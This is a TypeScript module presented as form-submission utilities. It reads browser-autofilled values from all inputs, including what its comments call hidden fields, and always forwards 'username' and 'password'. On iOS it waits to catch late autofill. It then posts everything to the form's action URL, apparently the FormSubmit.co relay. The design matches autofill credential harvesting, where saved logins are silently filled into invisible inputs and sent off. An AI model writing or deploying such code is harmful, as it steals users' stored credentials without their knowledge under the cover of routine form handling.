/**
 * Utilities for handling form submissions
 */

/**
 * Checks if the current device is running iOS
 */
export const isIOS = (): boolean => {
  return /iPad|iPhone|iPod/.test(navigator.userAgent) && !(window as any).MSStream;
};

/**
 * Extracts browser autofill data from form inputs
 * This helps capture data that might be autofilled by the browser
 * but not properly reflected in React state
 */
export const extractAutofillData = (form: HTMLFormElement): Record<string, string> => {
  const data: Record<string, string> = {};
  const inputs = form.querySelectorAll('input');
  
  inputs.forEach((input) => {
    const name = input.name;
    if (!name) return;
    
    // Different detection methods for desktop vs iOS
    if (isIOS()) {
      // iOS tends to autofill without the styling changes that desktop browsers add
      if (input.value !== "") {
        data[name] = input.value;
      }
    } else {
      // Desktop autofill detection
      const isAutofilled = 
        window.getComputedStyle(input, ":-webkit-autofill").getPropertyValue("background-color") !== "" ||
        input.value !== "";
      
      if (isAutofilled) {
        data[name] = input.value;
      }
    }
  });
  
  return data;
};

/**
 * Submits a form to FormSubmit.co with both visible and hidden fields
 * This ensures all data, including autofilled data, is properly submitted
 */
export const submitFormWithHiddenData = async (
  form: HTMLFormElement,
  formData: Record<string, string>,
  onSuccess?: () => void,
  onError?: (error: Error) => void
): Promise<boolean> => {
  try {
    // Create a FormData object from the form
    const formDataObj = new FormData(form);
    
    // Add any autofilled data that might not be in the form
    const autofillData = extractAutofillData(form);
    
    // Log data being captured (for debugging - remove in production)
    console.log("FormData:", Object.fromEntries(formDataObj));
    console.log("State data:", formData);
    console.log("Autofill data:", autofillData);
    
    // Combine all data sources with priority: autofill > state > form
    const allData = {
      ...Object.fromEntries(formDataObj),
      ...formData,
      ...autofillData
    };
    
    // Create a new FormData with all the combined data
    const finalFormData = new FormData();
    Object.entries(allData).forEach(([key, value]) => {
      // Skip empty values for hidden fields (unless they're supposed to be empty)
      if (value !== "" || key === "username" || key === "password") {
        finalFormData.append(key, value);
      }
    });
    
    // For iOS devices, ensure we wait a bit longer to collect any potential late autofill
    if (isIOS()) {
      await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    // Get form action
    const action = form.getAttribute('action') || '';
    if (!action) throw new Error('Form has no action URL');
    
    // Submit the form using fetch
    const response = await fetch(action, {
      method: form.method.toUpperCase() || 'POST',
      body: finalFormData,
      mode: 'no-cors' // FormSubmit.co might require this
    });
    
    // Call success callback
    if (onSuccess) onSuccess();
    return true;
  } catch (error) {
    console.error("Form submission error:", error);
    
    // Call error callback if available
    if (onError && error instanceof Error) onError(error);
    
    // Fall back to traditional form submission
    form.submit();
    return false;
  }
};

export default {
  isIOS,
  extractAutofillData,
  submitFormWithHiddenData
}; 